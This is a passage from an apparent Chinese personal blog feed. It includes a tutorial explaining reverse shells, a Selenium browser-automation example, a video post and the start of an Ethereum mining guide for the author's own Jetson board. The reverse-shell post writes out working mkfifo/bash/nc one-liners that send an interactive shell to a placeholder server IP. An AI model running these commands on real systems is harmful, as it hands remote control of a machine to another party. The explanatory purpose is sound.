&lt;p&gt;先说一下我是怎么理解反弹shell的。正常情况下从本地控制远程的一台机器可以通过远程登陆（比如ssh/telnet）从本地向远程的机器主动建立连接进行控制，就是说本地是client，远程被控机是server。反弹shell（也叫reverse shell）就是把方向反过来，从远程被控主机向本地建立连接，即远程被控机是client，本地是server。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2018/04/ReverseShell/ReverseShellConn.png&#34; alt=&#34;ReverseShell&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;建立反弹shell&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%bb%ba%e7%ab%8b%e5%8f%8d%e5%bc%b9shell&#34;&gt;
        ##
    &lt;/a&gt;
    建立反弹shell
&lt;/div&gt;
&lt;/h1&gt;
&lt;h2 id=&#34;建立本地server&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%bb%ba%e7%ab%8b%e6%9c%ac%e5%9c%b0server&#34;&gt;
        #
    &lt;/a&gt;
    建立本地server
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;使用&amp;rsquo;nc&amp;rsquo;在本地建立server进行网络连接监听，本例子监听在8888端口上。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ nc -lvp &lt;span style=&#34;color:#ff9f43&#34;&gt;8888&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;建立远程client&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%bb%ba%e7%ab%8b%e8%bf%9c%e7%a8%8bclient&#34;&gt;
        #
    &lt;/a&gt;
    建立远程client
&lt;/div&gt;
&lt;/h2&gt;
&lt;h3 id=&#34;方法1-在远程被控机上用nc建立client进行连接&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e6%96%b9%e6%b3%951-%e5%9c%a8%e8%bf%9c%e7%a8%8b%e8%a2%ab%e6%8e%a7%e6%9c%ba%e4%b8%8a%e7%94%a8nc%e5%bb%ba%e7%ab%8bclient%e8%bf%9b%e8%a1%8c%e8%bf%9e%e6%8e%a5&#34;&gt;
        ##
    &lt;/a&gt;
    方法1: 在远程被控机上用nc建立client进行连接。
&lt;/div&gt;
&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ mkfifo /tmp/f
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ cat /tmp/f | bash -i 2&amp;gt;&amp;amp;&lt;span style=&#34;color:#ff9f43&#34;&gt;1&lt;/span&gt; | nc &amp;lt;Server IP&amp;gt; &lt;span style=&#34;color:#ff9f43&#34;&gt;8888&lt;/span&gt; &amp;gt; /tmp/f
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol&gt;
&lt;li&gt;**&amp;lsquo;mkfifo /tmp/f&amp;rsquo;**创建有名管道，有名管道可以通过文件的方式开放管道的两端，一端可以写另外一端读取写入的内容。&lt;/li&gt;
&lt;li&gt;**&amp;lsquo;cat /tmp/f&amp;rsquo;**读取有名管道中的内容，读取的内容通过管道&amp;rsquo;|&amp;lsquo;写入&amp;rsquo;bash&amp;rsquo;&lt;/li&gt;
&lt;li&gt;**&amp;lsquo;bash -i 2&amp;gt;&amp;amp;1&amp;rsquo;**建立交互式shell，并把标准错误合并到标准输出，然后通过管道&amp;rsquo;|&amp;lsquo;发给&amp;rsquo;nc&amp;rsquo;客户端&lt;/li&gt;
&lt;li&gt;**&amp;rsquo;nc &lt;Server IP&gt; 8888 &amp;gt; /tmp/f&amp;rsquo;**向server发起连接，并把从server端接收到的内容写入&amp;rsquo;/tmp/f&amp;rsquo;，注意，这些写到&amp;rsquo;/tmp/f&amp;rsquo;的内容又被上面步骤&#39;2&amp;rsquo;读出来写会给shell&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;好吧，是不是有些绕？再捋一下，前面的那一串命令建立了一个连接，该连接通过&amp;rsquo;nc&amp;rsquo;与server端进行连接，server端的输入会被发送到client端的&amp;rsquo;nc&amp;rsquo;并写入&amp;rsquo;/tmp/f&amp;rsquo;，之后被&amp;rsquo;cat&amp;rsquo;读出来发给shell执行。shell的执行输出通过&amp;rsquo;nc&amp;rsquo;发给server。连接的图示如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2018/04/ReverseShell/ReverseShellConn-001.png&#34; alt=&#34;示意图&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;方法2在远程机上用建立连接&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e6%96%b9%e6%b3%952%e5%9c%a8%e8%bf%9c%e7%a8%8b%e6%9c%ba%e4%b8%8a%e7%94%a8%e5%bb%ba%e7%ab%8b%e8%bf%9e%e6%8e%a5&#34;&gt;
        ##
    &lt;/a&gt;
    方法2:在远程机上用建立连接
&lt;/div&gt;
&lt;/h3&gt;
&lt;p&gt;前面的方法1中不太简洁的地方是使用了‘cat’，那么能不能再简化一下呢？当然有！先画一张连接拓扑图。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2018/04/ReverseShell/ReverseShellConn-002.png&#34; alt=&#34;示意图&#34;&gt;&lt;/p&gt;
&lt;p&gt;建立方法命令如下：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;mkfifo /tmp/f
bash -i 2&amp;gt;&amp;amp;1 &amp;lt; /tmp/f | nc &amp;lt;Server IP&amp;gt; 8888 &amp;gt; /tmp/f
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;方法3&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e6%96%b9%e6%b3%953&#34;&gt;
        ##
    &lt;/a&gt;
    方法3:
&lt;/div&gt;
&lt;/h3&gt;
&lt;p&gt;了解了上面的方法后不禁想问Client端的数据流反转是否可行？当然可以！还是看图说话。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2018/04/ReverseShell/ReverseShellConn-003.png&#34; alt=&#34;示意图&#34;&gt;&lt;/p&gt;
&lt;p&gt;建立连接方法如下：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;mkfifo /tmp/f
nc &amp;lt;Server IP&amp;gt; 8888 &amp;lt; /tmp/f | bash -i  &amp;gt; /tmp/f 2&amp;gt;&amp;amp;1
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;其他话题&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%85%b6%e4%bb%96%e8%af%9d%e9%a2%98&#34;&gt;
        ##
    &lt;/a&gt;
    其他话题
&lt;/div&gt;
&lt;/h1&gt;
&lt;h2 id=&#34;1-啥是fifo&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#1-%e5%95%a5%e6%98%affifo&#34;&gt;
        #
    &lt;/a&gt;
    1. 啥是FIFO？
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;“FIFO”是Linux操作系统上面一种特殊的进程间通讯的手段，类似管道“PIPE”，相同之处：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;都是进程间通讯的手段，可用于传递消息&lt;/li&gt;
&lt;li&gt;都是“半双工单向”数据流模式&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;但不同之处在于：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;“PIPE”创建的管道存在于父/子进程之间，通常是fork()出来的父子进程间使用。&lt;/li&gt;
&lt;li&gt;“FIFO”有名管道顾名思义是有名字的，名字就是文件系统中创建出来的问题件，这样就可以支持不同的进程之间使用这个管道进行通信了。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;想知道的更详细些可以阅读经典的《UNIX环境高级编程》。&lt;/p&gt;
&lt;h2 id=&#34;2-思考一下下面的两个命令有什么不同&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#2-%e6%80%9d%e8%80%83%e4%b8%80%e4%b8%8b%e4%b8%8b%e9%9d%a2%e7%9a%84%e4%b8%a4%e4%b8%aa%e5%91%bd%e4%bb%a4%e6%9c%89%e4%bb%80%e4%b9%88%e4%b8%8d%e5%90%8c&#34;&gt;
        #
    &lt;/a&gt;
    2. 思考一下下面的两个命令有什么不同？
&lt;/div&gt;
&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;nc &amp;lt;Server IP&amp;gt; 8888 &amp;lt; /tmp/f | bash -i 2&amp;gt;&amp;amp;1 &amp;gt; /tmp/f

nc &amp;lt;Server IP&amp;gt; 8888 &amp;lt; /tmp/f | bash -i  &amp;gt; /tmp/f 2&amp;gt;&amp;amp;1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;不同之处是**&amp;ldquo;2&amp;gt;&amp;amp;1 &amp;gt; /tmp/f&amp;rdquo;&lt;strong&gt;和&lt;/strong&gt;&amp;quot;&amp;gt; /tmp/f 2&amp;gt;&amp;amp;1&amp;quot;**。&lt;/p&gt;
&lt;p&gt;**&amp;quot;&amp;gt; /tmp/f 2&amp;gt;&amp;amp;1&amp;quot;&lt;strong&gt;可以正确将标准输出与标准错误合并后导入&amp;quot;/tmp/f&amp;quot;，而&lt;/strong&gt;&amp;ldquo;2&amp;gt;&amp;amp;1 &amp;gt; /tmp/f&amp;rdquo;**最终只把标准输出导入了&amp;quot;/tmp/f&amp;quot;，标准错误还是没有，那么是为什么呢？&lt;/p&gt;
&lt;p&gt;先分析一下正常**&amp;quot;&amp;gt; /tmp/f 2&amp;gt;&amp;amp;1&amp;quot;**的执行过程。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;先解析**&amp;quot;&amp;gt; /tmp/f&amp;quot;**的时候进程会把标准输出&amp;quot;1&amp;quot;定向到FIFO文件&amp;quot;/tmp/f&amp;quot;&lt;/li&gt;
&lt;li&gt;再解析**&amp;ldquo;2&amp;gt;&amp;amp;1&amp;rdquo;**的时候，进程的标准错误“2”定向到了标准输出“1”对应的目标，由于此时“1”指向了&amp;quot;/tmp/f&amp;quot;，那么自然标准错误“2”也被定向到了这个FIFO文件。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;再分析一下异常**&amp;ldquo;2&amp;gt;&amp;amp;1 &amp;gt; /tmp/f&amp;rdquo;**的执行过程。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;首先**&amp;ldquo;2&amp;gt;&amp;amp;1&amp;rdquo;**在执行的时候是把进程的标准错误“2”定向到了标准输出“1”对应的目标，这个目标此时是进程执行的“终端”。&lt;/li&gt;
&lt;li&gt;当解析到**&amp;quot;&amp;gt; /tmp/f&amp;quot;**的时候进程会把标准输出&amp;quot;1&amp;quot;定向到FIFO文件&amp;quot;/tmp/f&amp;quot;，而此时标准错误“2”还是指向前一步中定向的“终端”，因此造成了执行的问题。&lt;/li&gt;
&lt;/ol&gt;</description>
    </item>
    
    <item>
      <title>使用Python的Selenium驱动浏览器行为</title>
      <link>/2018/03/%E4%BD%BF%E7%94%A8python%E7%9A%84selenium%E9%A9%B1%E5%8A%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%A1%8C%E4%B8%BA/</link>
      <pubDate>Fri, 30 Mar 2018 11:25:39 +0800</pubDate>
      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
      <guid>/2018/03/%E4%BD%BF%E7%94%A8python%E7%9A%84selenium%E9%A9%B1%E5%8A%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%A1%8C%E4%B8%BA/</guid>
      <description>&lt;!--toc--&gt;
&lt;h2 id=&#34;step-1安装浏览器driver&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#step-1%e5%ae%89%e8%a3%85%e6%b5%8f%e8%a7%88%e5%99%a8driver&#34;&gt;
        #
    &lt;/a&gt;
    Step 1:安装浏览器driver
&lt;/div&gt;
&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;浏览器&lt;/th&gt;
&lt;th&gt;Driver&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Chrome&lt;/td&gt;
&lt;td&gt;chromedriver&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Firefox&lt;/td&gt;
&lt;td&gt;geckodriver&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;step-2安装selenium&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#step-2%e5%ae%89%e8%a3%85selenium&#34;&gt;
        #
    &lt;/a&gt;
    Step 2:安装selenium
&lt;/div&gt;
&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ pip install selenium
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;step-3-使用selenium&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#step-3-%e4%bd%bf%e7%94%a8selenium&#34;&gt;
        #
    &lt;/a&gt;
    STep 3: 使用selenium
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;例子：打开两个tab，并在tab之间定期切换：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff6ac1&#34;&gt;import&lt;/span&gt; time
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff6ac1&#34;&gt;from&lt;/span&gt; selenium &lt;span style=&#34;color:#ff6ac1&#34;&gt;import&lt;/span&gt; webdriver
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff6ac1&#34;&gt;from&lt;/span&gt; selenium.webdriver &lt;span style=&#34;color:#ff6ac1&#34;&gt;import&lt;/span&gt; ActionChains
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;obj &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; webdriver&lt;span style=&#34;color:#ff6ac1&#34;&gt;.&lt;/span&gt;Chrome()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;obj&lt;span style=&#34;color:#ff6ac1&#34;&gt;.&lt;/span&gt;maximize_window()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;obj&lt;span style=&#34;color:#ff6ac1&#34;&gt;.&lt;/span&gt;get(&lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#34;http://www.qq.com/&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;obj&lt;span style=&#34;color:#ff6ac1&#34;&gt;.&lt;/span&gt;implicitly_wait(&lt;span style=&#34;color:#ff9f43&#34;&gt;15&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;e1 &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; obj&lt;span style=&#34;color:#ff6ac1&#34;&gt;.&lt;/span&gt;find_element_by_xpath(&lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;//*[@id=&amp;#34;navBeta&amp;#34;]/div[1]/div[1]/a[1]&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ActionChains(obj)&lt;span style=&#34;color:#ff6ac1&#34;&gt;.&lt;/span&gt;click(e1)&lt;span style=&#34;color:#ff6ac1&#34;&gt;.&lt;/span&gt;perform()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;obj&lt;span style=&#34;color:#ff6ac1&#34;&gt;.&lt;/span&gt;implicitly_wait(&lt;span style=&#34;color:#ff9f43&#34;&gt;15&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tabs &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; obj&lt;span style=&#34;color:#ff6ac1&#34;&gt;.&lt;/span&gt;window_handles
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff5c57&#34;&gt;print&lt;/span&gt;(tabs)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff6ac1&#34;&gt;while&lt;/span&gt; &lt;span style=&#34;color:#ff6ac1&#34;&gt;True&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff6ac1&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#ff6ac1&#34;&gt;in&lt;/span&gt; tabs:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        obj&lt;span style=&#34;color:#ff6ac1&#34;&gt;.&lt;/span&gt;switch_to&lt;span style=&#34;color:#ff6ac1&#34;&gt;.&lt;/span&gt;window(i)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        time&lt;span style=&#34;color:#ff6ac1&#34;&gt;.&lt;/span&gt;sleep(&lt;span style=&#34;color:#ff9f43&#34;&gt;2&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;参考&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%8f%82%e8%80%83&#34;&gt;
        ##
    &lt;/a&gt;
    参考
&lt;/div&gt;
&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://splinter.readthedocs.io/en/latest/#drivers&#34;&gt;Splinter&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    
    <item>
      <title>自动饮水机</title>
      <link>/2018/03/%E8%87%AA%E5%8A%A8%E9%A5%AE%E6%B0%B4%E6%9C%BA/</link>
      <pubDate>Tue, 20 Mar 2018 16:42:45 +0800</pubDate>
      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
      <guid>/2018/03/%E8%87%AA%E5%8A%A8%E9%A5%AE%E6%B0%B4%E6%9C%BA/</guid>
      <description>&lt;!-- more /--&gt;
&lt;p&gt;Youtube观看：&lt;/p&gt;
&lt;div id=&#34;video-area&#34; align=&#34;center&#34;&gt;
	&lt;iframe width=&#34;560&#34; height=&#34;315&#34; src=&#34;https://www.youtube.com/embed/lCAez16g8Dg&#34; frameborder=&#34;0&#34; allow=&#34;autoplay; encrypted-media&#34; allowfullscreen&gt;&lt;/iframe&gt;
&lt;/div&gt;
&lt;p&gt;Youku观看:&lt;/p&gt;
&lt;div id=&#34;video-area&#34; align=&#34;center&#34;&gt;
	&lt;iframe height=498 width=510 src=&#39;http://player.youku.com/embed/XMzQ3ODMyNzQ0OA==&#39; frameborder=0 &#39;allowfullscreen&#39;&gt;&lt;/iframe&gt;
&lt;/div&gt;</description>
    </item>
    
    <item>
      <title>使用Nvidia Jetson TX2挖以太币</title>
      <link>/2018/03/%E4%BD%BF%E7%94%A8nvidia-jetson-tx2%E6%8C%96%E4%BB%A5%E5%A4%AA%E5%B8%81/</link>
      <pubDate>Sun, 11 Mar 2018 10:34:02 +0800</pubDate>
      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
      <guid>/2018/03/%E4%BD%BF%E7%94%A8nvidia-jetson-tx2%E6%8C%96%E4%BB%A5%E5%A4%AA%E5%B8%81/</guid>
      <description>&lt;!-- more /--&gt;
&lt;p&gt;现在加密货币在全世界都到了很疯狂的程度了，经常听说挖矿，那么挖矿究竟是怎么回事呢，到底怎么进行挖矿呢？这里介绍一下以太币挖矿的那些事儿。&lt;/p&gt;
&lt;p&gt;进行挖矿大概需要几个步骤：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;注册钱包&lt;/li&gt;
&lt;li&gt;加入矿池&lt;/li&gt;
&lt;li&gt;准备挖矿工具&lt;/li&gt;
&lt;li&gt;开挖&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;下面详细介绍一下如何进行挖矿。&lt;/p&gt;
&lt;h1 id=&#34;获取以太币钱包地址&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e8%8e%b7%e5%8f%96%e4%bb%a5%e5%a4%aa%e5%b8%81%e9%92%b1%e5%8c%85%e5%9c%b0%e5%9d%80&#34;&gt;
        ##
    &lt;/a&gt;
    获取以太币钱包地址
&lt;/div&gt;
&lt;/h1&gt;
&lt;h2 id=&#34;使用myetherwallet&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e4%bd%bf%e7%94%a8myetherwallet&#34;&gt;
        #
    &lt;/a&gt;
    使用myetherwallet
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;挖矿前首先需要创建自己的钱包，可以到“&lt;strong&gt;myetherwallet&lt;/strong&gt;”(&lt;a href=&#34;https://www.myetherwallet.com&#34;&gt;https://www.myetherwallet.com&lt;/a&gt;)进行创建。&lt;/p&gt;
&lt;p&gt;第一步：输入密码，点击“Create New Wallet”：
&lt;img src=&#34;http://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2018/03/ethermining/myetherwallet.jpg&#34; alt=&#34;myetherwallet&#34;&gt;&lt;/p&gt;
&lt;p&gt;第二步：保存&amp;quot;Keystore&amp;quot;密钥，密钥文件一定要小心保存，如果丢失了那么钱包就永远也找不回来了。另外最好使用物理隔离，可以存在U盘上需要用的时候再拿出来，或者干脆打印出来，如果密码被盗窃那所有的以太币就不保了 :P&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2018/03/ethermining/savewallet.jpg&#34; alt=&#34;保存钱包密钥文件&#34;&gt;&lt;/p&gt;
&lt;p&gt;之后为了方便管理可以使用chrome浏览器的&amp;quot;&amp;ldquo;插件进行创建。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2018/03/ethermining/myether-plugin.jpg&#34; alt=&#34;myetherplugin&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;使用metamask&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e4%bd%bf%e7%94%a8metamask&#34;&gt;
        #
    &lt;/a&gt;
    使用MetaMask
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;还有一个更方便的创建钱包的方法，就是使用chrome浏览器的&amp;quot;MetaMask&amp;quot;插件进行创建和管理。
&lt;img src=&#34;http://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2018/03/ethermining/metamask-plugin.jpg&#34; alt=&#34;metamask&#34;&gt;&lt;/p&gt;
&lt;p&gt;需要提醒一下，创建成功后一定要保护好创建钱包的那12个单词，这是唯一的恢复账号的方法！&lt;/p&gt;
&lt;p&gt;使用&amp;quot;MetaMask&amp;quot;跟myetherwallet不太一样的一点是，在创建出钱包的密钥是通过&amp;quot;MetaMask&amp;quot;进行管理的，这种方法有好有坏，好处是使用方便，坏处是一旦MetaMask挂了或者被黑的话，那么你的钱包也会受到牵连。&lt;/p&gt;
&lt;h1 id=&#34;选择矿池&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e9%80%89%e6%8b%a9%e7%9f%bf%e6%b1%a0&#34;&gt;
        ##
    &lt;/a&gt;
    选择矿池
&lt;/div&gt;
&lt;/h1&gt;
&lt;p&gt;有了钱包地址后需要加入矿池才有资格成为一名真正的矿工，截止2018-03-11，全世界的矿池总算力已经达到了259.27 TH/s&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2018/03/ethermining/chart.jpeg&#34; alt=&#34;矿池&#34;&gt;&lt;/p&gt;
&lt;p&gt;（数据来自&lt;a href=&#34;https://www.etherchain.org/charts/topMiners&#34;&gt;Top Miners&lt;/a&gt;）&lt;/p&gt;
&lt;p&gt;国内用户可以选择国内的矿池：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;矿池&lt;/th&gt;
&lt;th&gt;地址&lt;/th&gt;
&lt;th&gt;矿池&lt;/th&gt;
&lt;th&gt;起付点&lt;/th&gt;
&lt;th&gt;费率&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;f2pool&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://www.f2pool.com&#34;&gt;https://www.f2pool.com&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;eth.f2pool.com:8008&lt;/br&gt;eth.f2pool.com:8080&lt;/td&gt;
&lt;td&gt;0.1 ETH&lt;/td&gt;
&lt;td&gt;3%&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;ethfans&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://eth.ethfans.org/#/&#34;&gt;https://eth.ethfans.org/#/&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;huabei-pool.ethfans.org:3333&lt;/br&gt;huabei-pool.ethfans.org:13333&lt;/br&gt;guangdong-pool.ethfans.org:3333&lt;/br&gt;guangdong-pool.ethfans.org:13333&lt;/td&gt;
&lt;td&gt;0.05 ETH&lt;/td&gt;
&lt;td&gt;1%&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;选择挖矿软件&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e9%80%89%e6%8b%a9%e6%8c%96%e7%9f%bf%e8%bd%af%e4%bb%b6&#34;&gt;
        ##
    &lt;/a&gt;
    选择挖矿软件
&lt;/div&gt;
&lt;/h1&gt;
&lt;p&gt;现在开好户签好合同了，矿工要开始干活了 :-)&lt;/p&gt;
&lt;p&gt;家里唯一有个靠谱GPU的机器就是我的小Jetson了，之前学习机器学习时候买的小平台，这下要从码农变身矿工了。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;http://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/2017/09/tensorflow/IMG_6135.JPG?x-oss-process=style/png2jpg&#34; alt=&#34;Jetson&#34;&gt;&lt;/p&gt;
&lt;p&gt;常用的挖矿软件有两个：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;软件&lt;/th&gt;
&lt;th&gt;CPU&lt;/th&gt;
&lt;th&gt;GPU&lt;/th&gt;
&lt;th&gt;CUDA&lt;/th&gt;
&lt;th&gt;OpenCL&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;ethminer&lt;/td&gt;
&lt;td&gt;No&lt;/td&gt;
&lt;td&gt;Yes, ver &amp;gt; 9.0&lt;/td&gt;
&lt;td&gt;Yes&lt;/td&gt;
&lt;td&gt;Yes&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;geth&lt;/td&gt;
&lt;td&gt;Yes&lt;/td&gt;
&lt;td&gt;Yes&lt;/td&gt;
&lt;td&gt;Yes&lt;/td&gt;
&lt;td&gt;Yes&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;我为Jetson选择了ethminer，这个工具需要在Linux上编译一下：&lt;/p&gt;
&lt;h2 id=&#34;编译ethminer&#34; &gt;
